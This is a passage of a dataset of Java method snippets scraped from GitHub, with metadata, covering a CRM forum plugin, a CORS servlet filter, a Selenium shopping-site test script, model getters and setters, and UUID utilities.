"throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void updateMessage(Connection con, DynActionForm form, Message message) throws BGException {\n\t\tint systemId = Utils.parseInt(message.getSystemId());\n\t\tif (systemId <= 0)\n\t\t\tthrow new BGMessageException(\"\u041a\u043e\u0434 \u0442\u0435\u043c\u044b \u0444\u043e\u0440\u0443\u043c\u0430 \u0434\u043e\u043b\u0436\u0435\u043d \u0431\u044b\u0442\u044c \u0447\u0438\u0441\u043b\u043e\u0432\u044b\u043c.\");\n\n\t\tMessageDAO messageDao = new MessageDAO(con);\n\t\tMessage existingMessage = messageDao.getMessageBySystemId(id, String.valueOf(systemId));\n\t\tif (existingMessage != null && existingMessage.getId() != message.getId())\n\t\t\tthrow new BGMessageException(\"\u0422\u0435\u043c\u0430 \u0443\u0436\u0435 \u043f\u0440\u0438\u0432\u044f\u0437\u0430\u043d\u0430, \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435: \" + existingMessage.getId() + \"; \u043f\u0440\u043e\u0446\u0435\u0441\u0441: \" + existingMessage.getProcessId());\n\n\t\tProcess process = new ProcessDAO(con).getProcess(message.getProcessId());\n\t\tboolean processClosed = process != null && process.getCloseTime() != null;\n\t\t\n\t\tConnection forumCon = forum.getConnectionPool().getDBConnectionFromPool();\n\t\ttry {\n\t\t\tForumDAO forumDao = new ForumDAO(forumCon);\n\t\t\tTopic topic = forumDao.getTopic(systemId);\n\t\t\tif (topic == null)\n\t\t\t\tthrow new BGMessageException(\"\u0423\u043a\u0430\u0437\u0430\u043d\u043d\u0430\u044f \u0442\u0435\u043c\u0430 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430 \u0432 \u0444\u043e\u0440\u0443\u043c\u0435.\");\n\n\t\t\tString markAdd = topicMark;\n\t\t\tString markRemove = topicMarkClosed;\n\t\t\tif (processClosed) {\n\t\t\t    markAdd = topicMarkClosed;\n\t\t\t    markRemove = topicMark;\n\t\t\t}\n\t\t\t\n\t\t\tif (!topic.getTitle().contains(markAdd)) {\n\t\t\t\tlog.info(\"Marking topic: \" + topic.getId());\n\n\t\t\t\tString titleWithMark = topic.getTitle().replace(markRemove, \"\") + markAdd;\n\t\t\t\ttopic.setTitle(titleWithMark);\n\t\t\t\tforumDao.updateTopicTitle(topic.getId(), titleWithMark);\n\n\t\t\t\tforumCon.commit();\n\t\t\t}\n\n\t\t\tmessage.setFromTime(topic.getLastPostTime());\n\t\t\t// TODO: \u041c\u043e\u0436\u0435\u0442 \u0441\u0434\u0435\u043b\u0430\u0442\u044c \u043f\u043e\u0437\u0434\u043d\u0435\u0435 \u043a\u043e\u043d\u0442\u0440\u043e\u043b\u044c \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u043d\u043d\u044b\u0445.\n\t\t\tmessage.setToTime(new Date());\n\t\t\tmessage.setSubject(topic.getTitle());\n\t\t\tmessage.setDirection(Message.DIRECTION_INCOMING);\n\t\t\tmessage.setFrom(\"\");\n\t\t\tmessage.setTo(\"\");\n\t\t\tmessage.setText(\"\");\n\t\t\tmessageDao.updateMessage(message);\n\t\t} catch (Exception ex) {\n\t\t\tlog.error(ex.getMessage(), ex);\n\t\t} finally {\n\t\t\tSQLUtils.closeConnection(forumCon);\n\t\t}\n\n\t\tlastCheckTime = new Date();\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57661, "method_name": "process", "class_name": "MessageTypeForumPost", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void process() {\n\t\tif (log.isDebugEnabled()) {\n\t\t\tlog.debug(\"Processing forum: \" + forum.getId());\n\t\t}\n\t\t\n\t\tConnection con = Setup.getSetup().getDBConnectionFromPool();\n\t\tConnection forumCon = forum.getConnectionPool().getDBConnectionFromPool();\n\t\ttry {\n\t\t\tForumDAO forumDao = new ForumDAO(forumCon);\n\t\t\tMessageDAO messageDao = new MessageDAO(con);\n\t\t\tProcessDAO processDao = new ProcessDAO(con);\n\n\t\t\tfor (Topic topic : forumDao.getTopicListChangedAfter(lastCheckTime)) {\n\t\t\t\tif (log.isDebugEnabled()) {\n\t\t\t\t\tlog.debug(\"New messages in topic: \" + topic.getId());\n\t\t\t\t}\n\n\t\t\t\tMessage message = messageDao.getMessageBySystemId(id, String.valueOf(topic.getId()));\n\t\t\t\tif (message == null || message.getProcessId() <= 0) {\n\t\t\t\t\tlog.debug(\"Message not found or process isn't linked.\");\t\t\t\t\t\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tProcess process = processDao.getProcess(message.getProcessId());\n\n\t\t\t\tfinal Date lastPostTime = topic.getLastPostTime();\n\n\t\t\t\t// \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u0431\u044b\u043b\u043e \u043f\u043e\u0441\u043b\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0439 \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u0438\n\t\t\t\t// \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0441\u0442\u0430\u0442\u0443\u0441\u0430\n\t\t\t\tif (lastPostTime.after(lastCheckTime) && lastPostTime.after(process.getStatusTime())) {\n\t\t\t\t\tlog.info(\"New message in process: \" + process.getId());\n\t\t\t\t\t\n\t\t\t\t\t// \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u0442\u0435\u043c\u044b \u0438 \u0434\u0430\u0442\u044b \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f, \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043c\u0430\u0440\u043a\u0435\u0440\u0430 \u0438 \u0442.\u043f.\n\t\t\t\t\tupdateMessage(con, null, message);\n\n\t\t\t\t\tboolean generateEvent = true;\n\n\t\t\t\t\tif (userNameParam != null) {\n\t\t\t\t\t\tParamValueDAO paramDao = new ParamValueDAO(con);\n\n\t\t\t\t\t\tfor (int executorId : process.getExecutorIds()) {\n\t\t\t\t\t\t\tString forumName = paramDao.getParamText(executorId, userNameParam.getId());\n\t\t\t\t\t\t\tif (topic.getLastPosterName().equals(forumName)) {\n\t\t\t\t\t\t\t\tlog.info(\"It's executor's message\");\n\n\t\t\t\t\t\t\t\tgenerateEvent = false;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\tif (generateEvent) {\n\t\t\t\t\t\tProcessType type = ProcessTypeCache.getProcessType(process.getTypeId());\n\t\t\t\t\t\tif (type == null) {\n\t\t\t\t\t\t\tlog.error(\"Not found process type with id:\" + process.getTypeId());\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tMessage msg = new Message();\n\t\t\t\t\t\t\tmsg.setText(\"\u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u0432 \u0444\u043e\u0440\u0443\u043c\u0435.\");\n\n\t\t\t\t\t\t\tEventProcessor.processEvent(\n\t\t\t\t\t\t\t\t\tnew ProcessMessageAddedEvent(DynActionForm.SERVER_FORM, msg, process),\n\t\t\t\t\t\t\t\t\ttype.getProperties().getActualScriptName(), new SingleConnectionConnectionSet(con));\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tcon.commit();\n\t\t\t}\n\t\t} catch (Exception ex) {\n\t\t\tlog.error(ex.getMessage(), ex);\n\t\t} finally {\n\t\t\tSQLUtils.closeConnection(forumCon, con);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/phpbb/dao/MessageTypeForumPost.java", "stars": "12", "class_props": {"extends": "MessageType", "implements": null, "modifiers": ["public"]}}, {"id": 57662, "method_name": "set", "class_name": "MutableCachingSupplier", "params": ["Supplier<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void set(Supplier<T> newSupplier) {\n\t\tsupplier = newSupplier;\n\t\tcache = null;\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/util/function/MutableCachingSupplier.java", "stars": "3", "class_props": {"extends": null, "implements": ["Supplier"], "modifiers": ["public"]}}, {"id": 57663, "method_name": "get", "class_name": "MutableCachingSupplier", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\tpublic T get() {\n\t\treturn cache == null ? cache = supplier.get() : cache;\n\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/util/function/MutableCachingSupplier.java", "stars": "3", "class_props": {"extends": null, "implements": ["Supplier"], "modifiers": ["public"]}}, {"id": 57664, "method_name": "init", "class_name": "CorsFilter", "params": ["FilterConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(FilterConfig filterConfig) throws ServletException {\n    \n    }", "url": "https://raw.githubusercontent.com/griabcrh/vue-activiti-demo/master/vue-activiti-service-demo/src/main/java/com/activiti/filter/CorsFilter.java", "stars": "25", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 57665, "method_name": "doFilter", "class_name": "CorsFilter", "params": ["ServletRequest", "ServletResponse", "FilterChain"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) servletRequest;\n        HttpServletResponse response = (HttpServletResponse) servletResponse;\n        response.setHeader(\"Access-Control-Allow-Origin\", \"*\");\n        response.setHeader(\"Access-Control-Allow-Methods\", \"*\");\n        response.setHeader(\"Access-Control-Max-Age\", \"3600\");\n        // \u63d0\u793aOPTIONS\u9884\u68c0\u65f6\uff0c\u540e\u7aef\u9700\u8981\u8bbe\u7f6e\u7684\u4e24\u4e2a\u5e38\u7528\u81ea\u5b9a\u4e49\u5934\n        response.setHeader(\"Access-Control-Allow-Headers\", \"Content-Type,X-Requested-With\");\n        // \u662f\u5426\u652f\u6301cookie\u8de8\u57df\n        response.setHeader(\"Access-Control-Allow-Credentials\", \"false\");\n        filterChain.doFilter(servletRequest, servletResponse);\n    }", "url": "https://raw.githubusercontent.com/griabcrh/vue-activiti-demo/master/vue-activiti-service-demo/src/main/java/com/activiti/filter/CorsFilter.java", "stars": "25", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 57666, "method_name": "destroy", "class_name": "CorsFilter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void destroy() {\n    \n    }", "url": "https://raw.githubusercontent.com/griabcrh/vue-activiti-demo/master/vue-activiti-service-demo/src/main/java/com/activiti/filter/CorsFilter.java", "stars": "25", "class_props": {"extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"id": 57667, "method_name": "main", "class_name": "Ajio", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException {\n\n\n\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"./drivers/chromedriver.exe\");\n\t\tSystem.setProperty(\"webdriver.chrome.silentOutput\", \"true\");\n\t\t\n\t\tChromeOptions options = new ChromeOptions();\n\t\toptions.addArguments(\"--disable-notifications\");\n\t\t\n\t\tDesiredCapabilities cap = new DesiredCapabilities();\n\t\tcap.setCapability(CapabilityType.UNEXPECTED_ALERT_BEHAVIOUR, UnexpectedAlertBehaviour.DISMISS);\n\t\toptions.merge(cap);\n\t\t\n\t\tdriver = new ChromeDriver(options);\n\t\tActions action = new Actions(driver);\n\t\tWebDriverWait wait = new WebDriverWait(driver, 30);\n\t\t\n\t\t\n\t\tdriver.get(\"https://www.ajio.com/shop/sale\");\n\t\tdriver.manage().timeouts().implicitlyWait(5000, TimeUnit.SECONDS);\n\t\tdriver.manage().window().maximize();\n\t\tThread.sleep(20000);\n\t\t\n\t\t//2) Enter Bags in the Search field and Select Bags in Women Handbags\n\t\tWebElement search = driver.findElementByXPath(\"//input[@placeholder = 'Search AJIO']\");\n\t\taction.click(search).build().perform();\n\t\tsearch.sendKeys(\"Bags\");\n\t\tWebElement WomenBags = driver.findElementByXPath(\"(//span[text() = 'Women Handbags'])[1]\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(WomenBags));\n\t\taction.click(WomenBags).build().perform();\n\t\t\n\t\t//System.out.println(\"Bags are searched\");\n\t\tThread.sleep(10000);\n\t\t\n\t\t//3) Click on five grid and Select SORT BY as \"What's New\"\n\t\tWebElement fiveGrid = driver.findElementByXPath(\"//div[@class = 'five-grid']\");\n\t\taction.click(fiveGrid).build().perform();\n\t\tThread.sleep(5000);\n\t\t\n\t\t//4) Enter Price Range Min as 2000 and Max as 5000\n\t\tdriver.findElementByXPath(\"//span[text() = 'price']\").click();\n\t\t\n\t\tWebElement minPrice = driver.findElementByXPath(\"//input[@id = 'minPrice']\");\n\t\tWebElement maxPrice = driver.findElementByXPath(\"//input[@id = 'maxPrice']\");\n\t\t\n\t\twait.until(ExpectedConditions.visibilityOf(minPrice));\n\t\t\n\t\tminPrice.sendKeys(\"2000\");\n\t\tmaxPrice.sendKeys(\"5000\");\n\t\t\n\t\tdriver.findElementByXPath(\"(//button[@type = 'submit'])[2]\").click();\n\t\t//System.out.println(\"Product filtered with Price range\");\n\t\t\n\t\t//5) Click on the product \"Puma Ferrari LS Shoulder Bag\"\n\t\t\n\t\tdriver.findElementByXPath(\"//img[contains(@alt,'Ferrari LS Shoulder Bag')]\").click();\n\t\t//System.out.println(\"Puma Bag selected\");\n\t\tThread.sleep(10000);\n\t\t\n\t\tSet<String> windows = driver.getWindowHandles();\n\t\tList<String> windowsList = new ArrayList<String>(windows);\n\t\tdriver.switchTo().window(windowsList.get(1));\n\t\tSystem.out.println(\"User Navigated to new Window\");\n\t\tSystem.out.println(driver.getTitle());\n\t\t\n\t\t\n\t\t//6) Verify the Coupon code for the price above 2690 is applicable for your product, \n\t\t//if applicable the get the Coupon Code and Calculate the discount price for the coupon\n\t\tWebElement eleBagPrice = driver.findElementByXPath(\"//div[@class='prod-sp']\");\n\t\tString BagPriceStr = eleBagPrice.getText();\n\t\tInteger BagPrice = Integer.parseInt(BagPriceStr.replaceAll(\"\\\\D\", \"\"));\n\t\tSystem.out.println(\"Bag Price is \"+ BagPrice);\n\t\t\n\t\tWebElement elePromoPrice = driver.findElementByXPath(\"//div[@class='promo-desc']\");\n\t\tString strPromoPrice = elePromoPrice.getText();\n\t\t//System.out.println(strPromoPrice);\n\t\tInteger DiscountPercentage = Integer.parseInt(strPromoPrice.replaceAll(\"\\\\D\", \"\").substring(0, 2)); \n\t\tInteger PromoPrice = Integer.parseInt(strPromoPrice.replaceAll(\"\\\\D\", \"\").substring(2, 6)); //Because replacing all the non integers give the percentage and price alone. Discount can never be 3 digits - 100%, hence always this code gives a 6 digit number\n\t\t\n\t\tSystem.out.println(\"Promotional Price Limit is \" +PromoPrice);\n\t\t//System.out.println(\"Discount Percentage is \" +DiscountPercentage);\n\t\tint intPriceBeforeCheckout = 0;\n\t\tif (BagPrice>PromoPrice) {\n\t\t\tSystem.out.println(\"Product Applicable for Discount\");\n\t\t\tdouble DiscountedPrice = BagPrice - (DiscountPercentage*BagPrice/100);\n\t\t\tintPriceBeforeCheckout= (int)Math.round(DiscountedPrice);\n\t\t\tSystem.out.println(\"Bag Price after Discount is \" + intPriceBeforeCheckout);\n\t\t\t\n\t\t\t}\n\t\telse\n\t\t{\n\t\t\tSystem.out.println(\"Product Not Applicable for Discount\");\n\t\t}\n\t\t\n\t\t\n\t\t//7) Check the availability of the product for pincode 560043, \n\t\t//print the expected delivery date if it is available\n\t\tWebElement enterPincode = driver.findElementByXPath(\"//span[contains(text(),'Enter pin-code')]\");\n\t\taction.click(enterPincode).build().perform();\n\t\t\n\t\tWebElement pincodePopup = driver.findElementByXPath(\"//input[@name='pincode']\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(pincodePopup));\n\t\t\n\t\tpincodePopup.sendKeys(\"560043\", Keys.ENTER);\n\t\t\n\t\tString EstimatedDelivery = driver.findElementByXPath(\"//div[contains(@class,'edd-pincode-msg-details')]\").getText();\n\t\tSystem.out.println(\"Estimated Delivery date is \" +EstimatedDelivery);\n\t\t\n\t\t\n\t\t//8) Click on Other Informations under Product Details and \n\t\t//Print the Customer Care address, phone and email\n\t\tWebElement moreInformation = driver.findElementByXPath(\"//div[@class='other-info-toggle']\");\n\t\tmoreInformation.click();\n\t\t//System.out.println(\"More information about the Product is displayed\");\n\t\t\n\t\tWebElement CustomerCare = driver.findElementByXPath(\"//span[text()='Customer Care Address']//following::span[@class='other-info']\");\n\t\tSystem.out.println(CustomerCare.getText());\n\t\t\n\t\t\n\t\t//9) Click on ADD TO BAG and then GO TO BAG\n\t\tdriver.findElementByXPath(\"//span[text()='ADD TO BAG']\").click();\n\t\t//System.out.println(\"Product Added to Bag\");\n\t\tThread.sleep(10000);\n\t\tWebElement eleGoToBag = driver.findElementByXPath(\"//span[text()='GO TO BAG']\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(eleGoToBag));\n\t\t\n\t\taction.click(eleGoToBag).build().perform();\n\t\t//System.out.println(\"User navigates to Cart page\");\n\t\t\n\t\t//10) Check the Order Total before apply coupon\n\t\tWebElement eleOrderTotal = driver.findElementByXPath(\"//span[text()='Order Total']//following-sibling::span\");\n\t\tString strOrderTotal = eleOrderTotal.getText();\n\t\t\n\t\tDouble doubleOrderTotal = Double.parseDouble(strOrderTotal.replaceAll(\"\\\\D\", \"\"));\n\t\tint OrderTotal = (int) Math.round(doubleOrderTotal);\n\t\tSystem.out.println(doubleOrderTotal);\n\t\tSystem.out.println(\"Order Total of the Product is \"+OrderTotal);\n\t\t\n\t\t//11) Enter Coupon Code and Click Apply\n\t\tWebElement eleCouponCode = driver.findElementByXPath(\"//input[@id='EPIC']\");\n\t\taction.click(eleCouponCode).build().perform();\n\t\t\n\t\tdriver.findElementByXPath(\"//button[text()='Apply']\").click();\n\t\t//System.out.println(\"Coupon Code Applied\");\n\t\t\n\t\t//12) Verify the Coupon Savings amount(round off if it in decimal) under Order Summary \n\t\t//and the matches the amount calculated in Product details\n\t\tWebElement elePriceAfterDiscount = driver.findElementByXPath(\"//div[contains(@class,'net-price best-price-strip')]\");\n\t\tString strPriceAfterDiscount = elePriceAfterDiscount.getText();\n\t\tSystem.out.println(strPriceAfterDiscount);\n\t\tDouble PriceAfterDiscount = Double.parseDouble(strPriceAfterDiscount.replaceAll(\"\\\\D\", \"\"));\n\t\tint intPriceAfterCheckout = (int) Math.round(PriceAfterDiscount);\n\t\tSystem.out.println(\"Price After Discount is \" +intPriceAfterCheckout);\n\t\t\n\t\tif(intPriceAfterCheckout == intPriceBeforeCheckout)\n\t\t{\n\t\t\tSystem.out.println(\"Price Before Checkout and Price After Checkout is a match\");\n\t\t}\n\t\t\n\t\t//13) Click on Delete and Delete the item from Bag\n\n\t\tdriver.findElementByXPath(\"//div[text()='delete-btn'\").click();\n\t\t\n\t\t//14) Close all the browsers\n\t\tdriver.quit();\n\n\n\t}", "url": "https://raw.githubusercontent.com/Code-WithPraveen/SeleniumAndJava/master/Ajio.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57668, "method_name": "getComment", "class_name": "ContractStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getComment()\n\t{\n\t\treturn comment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57669, "method_name": "setComment", "class_name": "ContractStatus", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setComment( String comment )\n\t{\n\t\tthis.comment = comment;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57670, "method_name": "getStatusId", "class_name": "ContractStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getStatusId()\n\t{\n\t\treturn statusId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57671, "method_name": "setStatusId", "class_name": "ContractStatus", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setStatusId( int statusId )\n\t{\n\t\tthis.statusId = statusId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57672, "method_name": "getStatus", "class_name": "ContractStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getStatus()\n\t{\n\t\treturn status;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57673, "method_name": "setStatus", "class_name": "ContractStatus", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setStatus( String status )\n\t{\n\t\tthis.status = status;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57674, "method_name": "getDateFrom", "class_name": "ContractStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDateFrom()\n\t{\n\t\treturn dateFrom;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57675, "method_name": "setDateFrom", "class_name": "ContractStatus", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDateFrom( Date dateFrom )\n\t{\n\t\tthis.dateFrom = dateFrom;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57676, "method_name": "getDateTo", "class_name": "ContractStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDateTo()\n\t{\n\t\treturn dateTo;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57677, "method_name": "setDateTo", "class_name": "ContractStatus", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDateTo( Date dateTo )\n\t{\n\t\tthis.dateTo = dateTo;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/status/ContractStatus.java", "stars": "12", "class_props": {"extends": "Id", "implements": ["PeriodSet"], "modifiers": ["public"]}}, {"id": 57678, "method_name": "runTest", "class_name": "BeforeTryCatchTest", "params": ["Map<String,String>"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void runTest(Map<String, String> parameters) throws Throwable {\n\t\tassertSuccessfulOptimization(TestMethods.class.getMethod(\"trying\", int.class), 10000000);\n\t}", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/test/src/testing/sipka/jvm/tailrec/BeforeTryCatchTest.java", "stars": "97", "class_props": {"extends": "TailRecOptimizerTestCase", "implements": null, "modifiers": ["public"]}}, {"id": 57679, "method_name": "trying", "class_name": "TestMethods", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\t\tpublic static void trying(int n) {\n\t\t\tif (n != 0) {\n\t\t\t\ttrying(n - 1);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\ttry {\n\t\t\t} catch (Throwable e) {\n\t\t\t\tthrow e;\n\t\t\t}\n\t\t}", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/test/src/testing/sipka/jvm/tailrec/BeforeTryCatchTest.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 57680, "method_name": "main", "class_name": "UUID64", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n//\t\t System.out.println(ObjectId.get().toString());\n//\t\t System.out.println(ObjectId.get().toHexString());\n\n        int len = 5;\n        for (int i = 0; i < len; i++) {\n            String str = UUID64.getNewUUID();\n            System.out.println(str);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57681, "method_name": "getNewUUID", "class_name": "UUID64", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getNewUUID() {\n        UUID newuuid = UUID.randomUUID();\n        String uuid = newuuid.toString();\n        uuid = uuid.replaceAll(\"-\", \"\");\n        return uuid;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57682, "method_name": "getNewValue", "class_name": "UUID64", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getNewValue() {\n        UUID newuuid = UUID.randomUUID();\n        String uuid = newuuid.toString();\n        uuid = uuid.replaceAll(\"-\", \"\").toUpperCase();\n        uuid = \"0\" + uuid;\n        uuid = hexToBinary(uuid);\n        uuid = binaryTo64(uuid);\n        return uuid;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57683, "method_name": "getNewValueByBase64", "class_name": "UUID64", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getNewValueByBase64() {\n        UUID newuuid = UUID.randomUUID();\n        String uuid = newuuid.toString();\n        uuid = uuid.replaceAll(\"-\", \"\");\n        byte[] data = toBytes(uuid);\n        return new BASE64Encoder().encode(data).substring(0, 22);\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57684, "method_name": "toBytes", "class_name": "UUID64", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] toBytes(String str) {\n        if (str == null || str.trim().equals(\"\")) {\n            return new byte[0];\n        }\n        byte[] bytes = new byte[str.length() / 2];\n        for (int i = 0; i < str.length() / 2; i++) {\n            String subStr = str.substring(i * 2, i * 2 + 2);\n            bytes[i] = (byte) Integer.parseInt(subStr, 16);\n        }\n        return bytes;\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57685, "method_name": "hexToBinary", "class_name": "UUID64", "params": ["String"], "throws": null, "modifiers": ["static"], "return_type": "String", "snippet": "    static String hexToBinary(String hex) {\n        StringBuffer sb = new StringBuffer();\n        if (hex == null || \"\".equals(hex))\n            return \"\";\n        for (int i = 0; i < hex.length(); i++) {\n            sb.append(hexToBinary(hex.charAt(i)));\n        }\n        return sb.toString();\n    }", "url": "https://raw.githubusercontent.com/JeremyKinge/rtm/master/rtm-common/src/main/java/com/kingge/rtm/utils/UUID64.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57686, "method_name": "hexToBinary", "class_name": "UUID64", "params": ["char"], "throws": null, "modifiers": ["static"], "return_type": "String", "snippet": "    static String hexToBinary(char hex) {\n        String binary = null;\n        switch (hex) {\n            case '0':\n                binary = \"0000\";\n                break;\n            case '1':\n                binary = \"0001\";\n                break;\n            case '2':\n                binary = \"0010\";\n                break;\n            case '3':\n                binary = \"0011\";\n                break;\n            case '4':\n                binary = \"0100\";\n                break;\n            case '5':\n                binary = \"0101\";\n                break;\n            case '6':\n                binary = \"0110\";\n                